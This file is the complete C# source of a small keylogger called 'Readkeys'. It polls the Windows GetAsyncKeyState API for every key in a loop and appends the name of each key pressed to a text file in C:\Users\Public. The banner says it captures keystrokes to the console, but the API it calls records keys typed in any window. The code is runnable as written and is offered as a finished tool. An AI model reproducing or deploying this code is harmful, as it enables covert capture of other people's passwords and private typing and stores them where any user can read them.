using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace ReadKeys
{
    class Program
    {
        static void Main(string[] args)
        {
            string sScan = "";
            string[] lines = { "Welcome", "to", "the logfile" };
            if (!System.IO.File.Exists(@"C:\Users\Public\WriteLines2.txt"))
            {
                using (System.IO.StreamWriter file =
                new System.IO.StreamWriter(@"C:\Users\Public\WriteLines2.txt"))
                {
                    foreach (string line in lines)
                    {
                        file.WriteLine(line);
                    }
                }
            }
            System.Console.WriteLine("*******************************************************************************");
            System.Console.WriteLine("*                                                                             *");
            System.Console.WriteLine("* Readkeys v0.0.1                                                             *");
            System.Console.WriteLine("*                                                                             *");
            System.Console.WriteLine("* Captures keystrokes to the console and appends them to textfile:            *");
            System.Console.WriteLine("* C:\\Users\\Public\\WriteLines2.txt                                             *");
            System.Console.WriteLine("*                                                                             *");
            System.Console.WriteLine("*                                                                             *");
            System.Console.WriteLine("* Use: readkeys                                                               *");
            System.Console.WriteLine("*                                                                             *");
            System.Console.WriteLine("*                                                                             *");
            System.Console.WriteLine("*                                                                             *");
            System.Console.WriteLine("*                                                                             *");
            System.Console.WriteLine("*                                                                             *");
            System.Console.WriteLine("* Copyright (c) 2014  Geert-Jan Uijtdewilligen                                *");
            System.Console.WriteLine("* This is free open source software that comes with no warranty, and you are  *");
            System.Console.WriteLine("* welcome to redistribute it under the terms of the GNU General Public License*");
            System.Console.WriteLine("* as published by the Free Software Foundation https://www.gnu.org/licenses/  *");
            System.Console.WriteLine("*                                                                             *");
            System.Console.WriteLine("*******************************************************************************");
            while (true)
            {
                using (System.IO.StreamWriter file =
                        new System.IO.StreamWriter(@"C:\Users\Public\WriteLines2.txt", true))
                {
                    kernel32.Sleep(100);
                    for (int i = 0; i < 255; i++)
                    {
                        int keyState = user32.GetAsyncKeyState(i);
                        if (keyState == 1 || keyState == -32767)
                        {
                            switch (i)
                            {
                                case (int)user32.VirtualKeyShort.LBUTTON: sScan = "LBUTTON"; break;
                                case (int)user32.VirtualKeyShort.RBUTTON: sScan = "RBUTTON"; break;
                                case (int)user32.VirtualKeyShort.CANCEL: sScan = "CANCEL"; break;
                                case (int)user32.VirtualKeyShort.MBUTTON: sScan = "MBUTTON"; break;
                                case (int)user32.VirtualKeyShort.XBUTTON1: sScan = "XBUTTON1"; break;
                                case (int)user32.VirtualKeyShort.XBUTTON2: sScan = "XBUTTON2"; break;
                                case (int)user32.VirtualKeyShort.BACK: sScan = "BACK"; break;
                                case (int)user32.VirtualKeyShort.TAB: sScan = "TAB"; break;
                                case (int)user32.VirtualKeyShort.CLEAR: sScan = "CLEAR"; break;
                                case (int)user32.VirtualKeyShort.RETURN: sScan = "RETURN"; break;
                                case (int)user32.VirtualKeyShort.SHIFT: sScan = "SHIFT"; break;
                                case (int)user32.VirtualKeyShort.CONTROL: sScan = "CONTROL"; break;
                                case (int)user32.VirtualKeyShort.MENU: sScan = "MENU"; break;
                                case (int)user32.VirtualKeyShort.PAUSE: sScan = "PAUSE"; break;
                                case (int)user32.VirtualKeyShort.CAPITAL: sScan = "CAPITAL"; break;
                                case (int)user32.VirtualKeyShort.KANA: sScan = "KANA"; break;
                                case (int)user32.VirtualKeyShort.JUNJA: sScan = "JUNJA"; break;
                                case (int)user32.VirtualKeyShort.FINAL: sScan = "FINAL"; break;
                                case (int)user32.VirtualKeyShort.HANJA: sScan = "HANJA"; break;
                                case (int)user32.VirtualKeyShort.ESCAPE: sScan = "ESCAPE"; break;
                                case (int)user32.VirtualKeyShort.CONVERT: sScan = "CONVERT"; break;
                                case (int)user32.VirtualKeyShort.NONCONVERT: sScan = "NONCONVERT"; break;
                                case (int)user32.VirtualKeyShort.ACCEPT: sScan = "ACCEPT"; break;
                                case (int)user32.VirtualKeyShort.MODECHANGE: sScan = "MODECHANGE"; break;
                                case (int)user32.VirtualKeyShort.SPACE: sScan = "SPACE"; break;
                                case (int)user32.VirtualKeyShort.PRIOR: sScan = "PRIOR"; break;
                                case (int)user32.VirtualKeyShort.NEXT: sScan = "NEXT"; break;
                                case (int)user32.VirtualKeyShort.END: sScan = "END"; break;
                                case (int)user32.VirtualKeyShort.HOME: sScan = "HOME"; break;
                                case (int)user32.VirtualKeyShort.LEFT: sScan = "LEFT"; break;
                                case (int)user32.VirtualKeyShort.UP: sScan = "UP"; break;
                                case (int)user32.VirtualKeyShort.RIGHT: sScan = "RIGHT"; break;
                                case (int)user32.VirtualKeyShort.DOWN: sScan = "DOWN"; break;
                                case (int)user32.VirtualKeyShort.SELECT: sScan = "SELECT"; break;
                                case (int)user32.VirtualKeyShort.PRINT: sScan = "PRINT"; break;
                                case (int)user32.VirtualKeyShort.EXECUTE: sScan = "EXECUTE"; break;
                                case (int)user32.VirtualKeyShort.SNAPSHOT: sScan = "SNAPSHOT"; break;
                                case (int)user32.VirtualKeyShort.INSERT: sScan = "INSERT"; break;
                                case (int)user32.VirtualKeyShort.DELETE: sScan = "DELETE"; break;
                                case (int)user32.VirtualKeyShort.HELP: sScan = "HELP"; break;
                                case (int)user32.VirtualKeyShort.KEY_0: sScan = "KEY_0"; break;
                                case (int)user32.VirtualKeyShort.KEY_1: sScan = "KEY_1"; break;
                                case (int)user32.VirtualKeyShort.KEY_2: sScan = "KEY_2"; break;
                                case (int)user32.VirtualKeyShort.KEY_3: sScan = "KEY_3"; break;
                                case (int)user32.VirtualKeyShort.KEY_4: sScan = "KEY_4"; break;
                                case (int)user32.VirtualKeyShort.KEY_5: sScan = "KEY_5"; break;
                                case (int)user32.VirtualKeyShort.KEY_6: sScan = "KEY_6"; break;
                                case (int)user32.VirtualKeyShort.KEY_7: sScan = "KEY_7"; break;
                                case (int)user32.VirtualKeyShort.KEY_8: sScan = "KEY_8"; break;
                                case (int)user32.VirtualKeyShort.KEY_9: sScan = "KEY_9"; break;
                                case (int)user32.VirtualKeyShort.KEY_A: sScan = "KEY_A"; break;
                                case (int)user32.VirtualKeyShort.KEY_B: sScan = "KEY_B"; break;
                                case (int)user32.VirtualKeyShort.KEY_C: sScan = "KEY_C"; break;
                                case (int)user32.VirtualKeyShort.KEY_D: sScan = "KEY_D"; break;
                                case (int)user32.VirtualKeyShort.KEY_E: sScan = "KEY_E"; break;
                                case (int)user32.VirtualKeyShort.KEY_F: sScan = "KEY_F"; break;
                                case (int)user32.VirtualKeyShort.KEY_G: sScan = "KEY_G"; break;
                                case (int)user32.VirtualKeyShort.KEY_H: sScan = "KEY_H"; break;
                                case (int)user32.VirtualKeyShort.KEY_I: sScan = "KEY_I"; break;
                                case (int)user32.VirtualKeyShort.KEY_J: sScan = "KEY_J"; break;
                                case (int)user32.VirtualKeyShort.KEY_K: sScan = "KEY_K"; break;
                                case (int)user32.VirtualKeyShort.KEY_L: sScan = "KEY_L"; break;
                                case (int)user32.VirtualKeyShort.KEY_M: sScan = "KEY_M"; break;
                                case (int)user32.VirtualKeyShort.KEY_N: sScan = "KEY_N"; break;
                                case (int)user32.VirtualKeyShort.KEY_O: sScan = "KEY_O"; break;
                                case (int)user32.VirtualKeyShort.KEY_P: sScan = "KEY_P"; break;
                                case (int)user32.VirtualKeyShort.KEY_Q: sScan = "KEY_Q"; break;
                                case (int)user32.VirtualKeyShort.KEY_R: sScan = "KEY_R"; break;
                                case (int)user32.VirtualKeyShort.KEY_S: sScan = "KEY_S"; break;
                                case (int)user32.VirtualKeyShort.KEY_T: sScan = "KEY_T"; break;
                                case (int)user32.VirtualKeyShort.KEY_U: sScan = "KEY_U"; break;
                                case (int)user32.VirtualKeyShort.KEY_V: sScan = "KEY_V"; break;
                                case (int)user32.VirtualKeyShort.KEY_W: sScan = "KEY_W"; break;
                                case (int)user32.VirtualKeyShort.KEY_X: sScan = "KEY_X"; break;
                                case (int)user32.VirtualKeyShort.KEY_Y: sScan = "KEY_Y"; break;
                                case (int)user32.VirtualKeyShort.KEY_Z: sScan = "KEY_Z"; break;
                                case (int)user32.VirtualKeyShort.LWIN: sScan = "LWIN"; break;
                                case (int)user32.VirtualKeyShort.RWIN: sScan = "RWIN"; break;
                                case (int)user32.VirtualKeyShort.APPS: sScan = "APPS"; break;
                                case (int)user32.VirtualKeyShort.SLEEP: sScan = "SLEEP"; break;
                                case (int)user32.VirtualKeyShort.NUMPAD0: sScan = "NUMPAD0"; break;
                                case (int)user32.VirtualKeyShort.NUMPAD1: sScan = "NUMPAD1"; break;
                                case (int)user32.VirtualKeyShort.NUMPAD2: sScan = "NUMPAD2"; break;
                                case (int)user32.VirtualKeyShort.NUMPAD3: sScan = "NUMPAD3"; break;
                                case (int)user32.VirtualKeyShort.NUMPAD4: sScan = "NUMPAD4"; break;
                                case (int)user32.VirtualKeyShort.NUMPAD5: sScan = "NUMPAD5"; break;
                                case (int)user32.VirtualKeyShort.NUMPAD6: sScan = "NUMPAD6"; break;
                                case (int)user32.VirtualKeyShort.NUMPAD7: sScan = "NUMPAD7"; break;
                                case (int)user32.VirtualKeyShort.NUMPAD8: sScan = "NUMPAD8"; break;
                                case (int)user32.VirtualKeyShort.NUMPAD9: sScan = "NUMPAD9"; break;
                                case (int)user32.VirtualKeyShort.MULTIPLY: sScan = "MULTIPLY"; break;
                                case (int)user32.VirtualKeyShort.ADD: sScan = "ADD"; break;
                                case (int)user32.VirtualKeyShort.SEPARATOR: sScan = "SEPARATOR"; break;
                                case (int)user32.VirtualKeyShort.SUBTRACT: sScan = "SUBTRACT"; break;
                                case (int)user32.VirtualKeyShort.DECIMAL: sScan = "DECIMAL"; break;
                                case (int)user32.VirtualKeyShort.DIVIDE: sScan = "DIVIDE"; break;
                                case (int)user32.VirtualKeyShort.F1: sScan = "F1"; break;
                                case (int)user32.VirtualKeyShort.F2: sScan = "F2"; break;
                                case (int)user32.VirtualKeyShort.F3: sScan = "F3"; break;
                                case (int)user32.VirtualKeyShort.F4: sScan = "F4"; break;
                                case (int)user32.VirtualKeyShort.F5: sScan = "F5"; break;
                                case (int)user32.VirtualKeyShort.F6: sScan = "F6"; break;
                                case (int)user32.VirtualKeyShort.F7: sScan = "F7"; break;
                                case (int)user32.VirtualKeyShort.F8: sScan = "F8"; break;
                                case (int)user32.VirtualKeyShort.F9: sScan = "F9"; break;
                                case (int)user32.VirtualKeyShort.F10: sScan = "F10"; break;
                                case (int)user32.VirtualKeyShort.F11: sScan = "F11"; break;
                                case (int)user32.VirtualKeyShort.F12: sScan = "F12"; break;
                                case (int)user32.VirtualKeyShort.F13: sScan = "F13"; break;
                                case (int)user32.VirtualKeyShort.F14: sScan = "F14"; break;
                                case (int)user32.VirtualKeyShort.F15: sScan = "F15"; break;
                                case (int)user32.VirtualKeyShort.F16: sScan = "F16"; break;
                                case (int)user32.VirtualKeyShort.F17: sScan = "F17"; break;
                                case (int)user32.VirtualKeyShort.F18: sScan = "F18"; break;
                                case (int)user32.VirtualKeyShort.F19: sScan = "F19"; break;
                                case (int)user32.VirtualKeyShort.F20: sScan = "F20"; break;
                                case (int)user32.VirtualKeyShort.F21: sScan = "F21"; break;
                                case (int)user32.VirtualKeyShort.F22: sScan = "F22"; break;
                                case (int)user32.VirtualKeyShort.F23: sScan = "F23"; break;
                                case (int)user32.VirtualKeyShort.F24: sScan = "F24"; break;
                                case (int)user32.VirtualKeyShort.NUMLOCK: sScan = "NUMLOCK"; break;
                                case (int)user32.VirtualKeyShort.SCROLL: sScan = "SCROLL"; break;
                                case (int)user32.VirtualKeyShort.LSHIFT: sScan = "LSHIFT"; break;
                                case (int)user32.VirtualKeyShort.RSHIFT: sScan = "RSHIFT"; break;
                                case (int)user32.VirtualKeyShort.LCONTROL: sScan = "LCONTROL"; break;
                                case (int)user32.VirtualKeyShort.RCONTROL: sScan = "RCONTROL"; break;
                                case (int)user32.VirtualKeyShort.LMENU: sScan = "LMENU"; break;
                                case (int)user32.VirtualKeyShort.RMENU: sScan = "RMENU"; break;
                                case (int)user32.VirtualKeyShort.BROWSER_BACK: sScan = "BROWSER_BACK"; break;
                                case (int)user32.VirtualKeyShort.BROWSER_FORWARD: sScan = "BROWSER_FORWARD"; break;
                                case (int)user32.VirtualKeyShort.BROWSER_REFRESH: sScan = "BROWSER_REFRESH"; break;
                                case (int)user32.VirtualKeyShort.BROWSER_STOP: sScan = "BROWSER_STOP"; break;
                                case (int)user32.VirtualKeyShort.BROWSER_SEARCH: sScan = "BROWSER_SEARCH"; break;
                                case (int)user32.VirtualKeyShort.BROWSER_FAVORITES: sScan = "BROWSER_FAVORITES"; break;
                                case (int)user32.VirtualKeyShort.BROWSER_HOME: sScan = "BROWSER_HOME"; break;
                                case (int)user32.VirtualKeyShort.VOLUME_MUTE: sScan = "VOLUME_MUTE"; break;
                                case (int)user32.VirtualKeyShort.VOLUME_DOWN: sScan = "VOLUME_DOWN"; break;
                                case (int)user32.VirtualKeyShort.VOLUME_UP: sScan = "VOLUME_UP"; break;
                                case (int)user32.VirtualKeyShort.MEDIA_NEXT_TRACK: sScan = "MEDIA_NEXT_TRACK"; break;
                                case (int)user32.VirtualKeyShort.MEDIA_PREV_TRACK: sScan = "MEDIA_PREV_TRACK"; break;
                                case (int)user32.VirtualKeyShort.MEDIA_STOP: sScan = "MEDIA_STOP"; break;
                                case (int)user32.VirtualKeyShort.MEDIA_PLAY_PAUSE: sScan = "MEDIA_PLAY_PAUSE"; break;
                                case (int)user32.VirtualKeyShort.LAUNCH_MAIL: sScan = "LAUNCH_MAIL"; break;
                                case (int)user32.VirtualKeyShort.LAUNCH_MEDIA_SELECT: sScan = "LAUNCH_MEDIA_SELECT"; break;
                                case (int)user32.VirtualKeyShort.LAUNCH_APP1: sScan = "LAUNCH_APP1"; break;
                                case (int)user32.VirtualKeyShort.LAUNCH_APP2: sScan = "LAUNCH_APP2"; break;
                                case (int)user32.VirtualKeyShort.OEM_1: sScan = "OEM_1"; break;
                                case (int)user32.VirtualKeyShort.OEM_PLUS: sScan = "OEM_PLUS"; break;
                                case (int)user32.VirtualKeyShort.OEM_COMMA: sScan = "OEM_COMMA"; break;
                                case (int)user32.VirtualKeyShort.OEM_MINUS: sScan = "OEM_MINUS"; break;
                                case (int)user32.VirtualKeyShort.OEM_PERIOD: sScan = "OEM_PERIOD"; break;
                                case (int)user32.VirtualKeyShort.OEM_2: sScan = "OEM_2"; break;
                                case (int)user32.VirtualKeyShort.OEM_3: sScan = "OEM_3"; break;
                                case (int)user32.VirtualKeyShort.OEM_4: sScan = "OEM_4"; break;
                                case (int)user32.VirtualKeyShort.OEM_5: sScan = "OEM_5"; break;
                                case (int)user32.VirtualKeyShort.OEM_6: sScan = "OEM_6"; break;
                                case (int)user32.VirtualKeyShort.OEM_7: sScan = "OEM_7"; break;
                                case (int)user32.VirtualKeyShort.OEM_8: sScan = "OEM_8"; break;
                                case (int)user32.VirtualKeyShort.OEM_102: sScan = "OEM_102"; break;
                                case (int)user32.VirtualKeyShort.PROCESSKEY: sScan = "PROCESSKEY"; break;
                                case (int)user32.VirtualKeyShort.PACKET: sScan = "PACKET"; break;
                                case (int)user32.VirtualKeyShort.ATTN: sScan = "ATTN"; break;
                                case (int)user32.VirtualKeyShort.CRSEL: sScan = "CRSEL"; break;
                                case (int)user32.VirtualKeyShort.EXSEL: sScan = "EXSEL"; break;
                                case (int)user32.VirtualKeyShort.EREOF: sScan = "EREOF"; break;
                                case (int)user32.VirtualKeyShort.PLAY: sScan = "PLAY"; break;
                                case (int)user32.VirtualKeyShort.ZOOM: sScan = "ZOOM"; break;
                                case (int)user32.VirtualKeyShort.NONAME: sScan = "NONAME"; break;
                                case (int)user32.VirtualKeyShort.PA1: sScan = "PA1"; break;
                                case (int)user32.VirtualKeyShort.OEM_CLEAR: sScan = "OEM_CLEAR"; break;
                            }
                            Console.WriteLine(sScan);
                            file.WriteLine(sScan);
                            break;
                        }
                    }
                }
            }
        }
    }

    public class user32
    {
        public enum VirtualKeyShort : short
        {
            LBUTTON = 0x01,             //Left mouse button
            RBUTTON = 0x02,             //Right mouse button
            CANCEL = 0x03,              //Control-break processing
            MBUTTON = 0x04,             //Middle mouse button (three-button mouse)
            XBUTTON1 = 0x05,            //Windows 2000/XP: X1 mouse button
            XBUTTON2 = 0x06,            //Windows 2000/XP: X2 mouse button
            BACK = 0x08,                //BACKSPACE key
            TAB = 0x09,                 //TAB key
            CLEAR = 0x0C,               //CLEAR key
            RETURN = 0x0D,              //ENTER key
            SHIFT = 0x10,               //SHIFT key
            CONTROL = 0x11,             //CTRL key
            MENU = 0x12,                //ALT key
            PAUSE = 0x13,               //PAUSE key
            CAPITAL = 0x14,             //CAPS LOCK key
            KANA = 0x15,                //Input Method Editor (IME) Kana mode
            HANGUL = 0x15,              //IME Hangul mode
            JUNJA = 0x17,               //IME Junja mode
            FINAL = 0x18,               //IME final mode
            HANJA = 0x19,               //IME Hanja mode
            KANJI = 0x19,               //IME Kanji mode
            ESCAPE = 0x1B,              //ESC key
            CONVERT = 0x1C,             //IME convert
            NONCONVERT = 0x1D,          //IME nonconvert
            ACCEPT = 0x1E,              //IME accept
            MODECHANGE = 0x1F,          //IME mode change request
            SPACE = 0x20,               //SPACEBAR
            PRIOR = 0x21,               //PAGE UP key
            NEXT = 0x22,                //PAGE DOWN key
            END = 0x23,                 //END key
            HOME = 0x24,                //HOME key
            LEFT = 0x25,                //LEFT ARROW key
            UP = 0x26,                  //UP ARROW key
            RIGHT = 0x27,               //RIGHT ARROW key
            DOWN = 0x28,                //DOWN ARROW key
            SELECT = 0x29,              //SELECT key
            PRINT = 0x2A,               //PRINT key
            EXECUTE = 0x2B,             //EXECUTE key
            SNAPSHOT = 0x2C,            //PRINT SCREEN key
            INSERT = 0x2D,              //INS key
            DELETE = 0x2E,              //DEL key
            HELP = 0x2F,                //HELP key
            KEY_0 = 0x30,               //0 key
            KEY_1 = 0x31,               //1 key
            KEY_2 = 0x32,               //2 key
            KEY_3 = 0x33,               //3 key
            KEY_4 = 0x34,               //4 key
            KEY_5 = 0x35,               //5 key
            KEY_6 = 0x36,               //6 key
            KEY_7 = 0x37,               //7 key
            KEY_8 = 0x38,               //8 key
            KEY_9 = 0x39,               //9 key
            KEY_A = 0x41,               //A key
            KEY_B = 0x42,               //B key
            KEY_C = 0x43,               //C key
            KEY_D = 0x44,               //D key
            KEY_E = 0x45,               //E key
            KEY_F = 0x46,               //F key
            KEY_G = 0x47,               //G key
            KEY_H = 0x48,               //H key
            KEY_I = 0x49,               //I key
            KEY_J = 0x4A,               //J key
            KEY_K = 0x4B,               //K key
            KEY_L = 0x4C,               //L key
            KEY_M = 0x4D,               //M key
            KEY_N = 0x4E,               //N key
            KEY_O = 0x4F,               //O key
            KEY_P = 0x50,               //P key
            KEY_Q = 0x51,               //Q key
            KEY_R = 0x52,               //R key
            KEY_S = 0x53,               //S key
            KEY_T = 0x54,               //T key
            KEY_U = 0x55,               //U key
            KEY_V = 0x56,               //V key
            KEY_W = 0x57,               //W key
            KEY_X = 0x58,               //X key
            KEY_Y = 0x59,               //Y key
            KEY_Z = 0x5A,               //Z key
            LWIN = 0x5B,                //Left Windows key (Microsoft Natural keyboard)
            RWIN = 0x5C,                //Right Windows key (Natural keyboard)
            APPS = 0x5D,                //Applications key (Natural keyboard)
            SLEEP = 0x5F,               //Computer Sleep key
            NUMPAD0 = 0x60,             //Numeric keypad 0 key
            NUMPAD1 = 0x61,             //Numeric keypad 1 key
            NUMPAD2 = 0x62,             //Numeric keypad 2 key
            NUMPAD3 = 0x63,             //Numeric keypad 3 key
            NUMPAD4 = 0x64,             //Numeric keypad 4 key
            NUMPAD5 = 0x65,             //Numeric keypad 5 key
            NUMPAD6 = 0x66,             //Numeric keypad 6 key
            NUMPAD7 = 0x67,             //Numeric keypad 7 key
            NUMPAD8 = 0x68,             //Numeric keypad 8 key
            NUMPAD9 = 0x69,             //Numeric keypad 9 key
            MULTIPLY = 0x6A,            //Multiply key
            ADD = 0x6B,                 //Add key
            SEPARATOR = 0x6C,           //Separator key
            SUBTRACT = 0x6D,            //Subtract key
            DECIMAL = 0x6E,             //Decimal key
            DIVIDE = 0x6F,              //Divide key
            F1 = 0x70,                  //F1 key
            F2 = 0x71,                  //F2 key
            F3 = 0x72,                  //F3 key
            F4 = 0x73,                  //F4 key
            F5 = 0x74,                  //F5 key
            F6 = 0x75,                  //F6 key
            F7 = 0x76,                  //F7 key
            F8 = 0x77,                  //F8 key
            F9 = 0x78,                  //F9 key
            F10 = 0x79,                 //F10 key
            F11 = 0x7A,                 //F11 key
            F12 = 0x7B,                 //F12 key
            F13 = 0x7C,                 //F13 key
            F14 = 0x7D,                 //F14 key
            F15 = 0x7E,                 //F15 key
            F16 = 0x7F,                 //F16 key
            F17 = 0x80,                 //F17 key  
            F18 = 0x81,                 //F18 key  
            F19 = 0x82,                 //F19 key  
            F20 = 0x83,                 //F20 key  
            F21 = 0x84,                 //F21 key  
            F22 = 0x85,                 //F22 key, (PPC only) Key used to lock device.
            F23 = 0x86,                 //F23 key  
            F24 = 0x87,                 //F24 key  
            NUMLOCK = 0x90,             //NUM LOCK key
            SCROLL = 0x91,              //SCROLL LOCK key
            LSHIFT = 0xA0,              //Left SHIFT key
            RSHIFT = 0xA1,              //Right SHIFT key
            LCONTROL = 0xA2,            //Left CONTROL key
            RCONTROL = 0xA3,            //Right CONTROL key
            LMENU = 0xA4,               //Left MENU key
            RMENU = 0xA5,               //Right MENU key
            BROWSER_BACK = 0xA6,        //Windows 2000/XP: Browser Back key
            BROWSER_FORWARD = 0xA7,     //Windows 2000/XP: Browser Forward key
            BROWSER_REFRESH = 0xA8,     //Windows 2000/XP: Browser Refresh key
            BROWSER_STOP = 0xA9,        //Windows 2000/XP: Browser Stop key
            BROWSER_SEARCH = 0xAA,      //Windows 2000/XP: Browser Search key
            BROWSER_FAVORITES = 0xAB,   //Windows 2000/XP: Browser Favorites key
            BROWSER_HOME = 0xAC,        //Windows 2000/XP: Browser Start and Home key
            VOLUME_MUTE = 0xAD,         //Windows 2000/XP: Volume Mute key
            VOLUME_DOWN = 0xAE,         //Windows 2000/XP: Volume Down key
            VOLUME_UP = 0xAF,           //Windows 2000/XP: Volume Up key
            MEDIA_NEXT_TRACK = 0xB0,    //Windows 2000/XP: Next Track key
            MEDIA_PREV_TRACK = 0xB1,    //Windows 2000/XP: Previous Track key
            MEDIA_STOP = 0xB2,          //Windows 2000/XP: Stop Media key
            MEDIA_PLAY_PAUSE = 0xB3,    //Windows 2000/XP: Play/Pause Media key
            LAUNCH_MAIL = 0xB4,         //Windows 2000/XP: Start Mail key
            LAUNCH_MEDIA_SELECT = 0xB5, //Windows 2000/XP: Select Media key
            LAUNCH_APP1 = 0xB6,         //Windows 2000/XP: Start Application 1 key
            LAUNCH_APP2 = 0xB7,         //Windows 2000/XP: Start Application 2 key
            OEM_1 = 0xBA,               //Used for miscellaneous characters; it can vary by keyboard.
            OEM_PLUS = 0xBB,            //Windows 2000/XP: For any country/region, the '+' key
            OEM_COMMA = 0xBC,           //Windows 2000/XP: For any country/region, the ',' key
            OEM_MINUS = 0xBD,           //Windows 2000/XP: For any country/region, the '-' key
            OEM_PERIOD = 0xBE,          //Windows 2000/XP: For any country/region, the '.' key
            OEM_2 = 0xBF,               //Used for miscellaneous characters; it can vary by keyboard.
            OEM_3 = 0xC0,               //Used for miscellaneous characters; it can vary by keyboard.
            OEM_4 = 0xDB,               //Used for miscellaneous characters; it can vary by keyboard.
            OEM_5 = 0xDC,               //Used for miscellaneous characters; it can vary by keyboard.
            OEM_6 = 0xDD,               //Used for miscellaneous characters; it can vary by keyboard.
            OEM_7 = 0xDE,               //Used for miscellaneous characters; it can vary by keyboard.
            OEM_8 = 0xDF,               //Used for miscellaneous characters; it can vary by keyboard.
            OEM_102 = 0xE2,             //Windows 2000/XP: Either the angle bracket key or the backslash key on the RT 102-key keyboard
            PROCESSKEY = 0xE5,          //Windows 95/98/Me, Windows NT 4.0, Windows 2000/XP: IME PROCESS key
            PACKET = 0xE7,              //Windows 2000/XP: Used to pass Unicode characters as if they were keystrokes.
            //The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods. For more information,
            //see Remark in KEYBDINPUT, SendInput, WM_KEYDOWN, and WM_KEYUP
            ATTN = 0xF6,                //Attn key
            CRSEL = 0xF7,               //CrSel key
            EXSEL = 0xF8,               //ExSel key
            EREOF = 0xF9,               //Erase EOF key
            PLAY = 0xFA,                //Play key
            ZOOM = 0xFB,                //Zoom key
            NONAME = 0xFC,              //Reserved
            PA1 = 0xFD,                 //PA1 key
            OEM_CLEAR = 0xFE            //Clear key
        }
        [DllImport("user32.dll", EntryPoint = "GetAsyncKeyState", 
        ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetAsyncKeyState(Int32 i);
    }
    public class kernel32
    {
        /// Exit Thread
        [DllImport("kernel32.dll", EntryPoint = "ExitThread",
        ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern void ExitThread(uint dwExitCode);
        /// Beep
        [DllImport("kernel32.dll", EntryPoint = "Beep",
        ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool Beep(uint dwFreq, uint dwDuration);
        /// Exit Process
        [DllImport("kernel32.dll", EntryPoint = "ExitProcess",
        ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern void ExitProcess(uint uExitCode);
        /// Sleep
        [DllImport("kernel32.dll", EntryPoint = "Sleep",
        ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern void Sleep(uint dwMilliseconds);
        /// TerminateThread
        [DllImport("kernel32.dll", EntryPoint = "TerminateThread",
        ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);
        /// TerminateProcess
        [DllImport("kernel32.dll", EntryPoint = "TerminateProcess",
        ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
    }
}


      
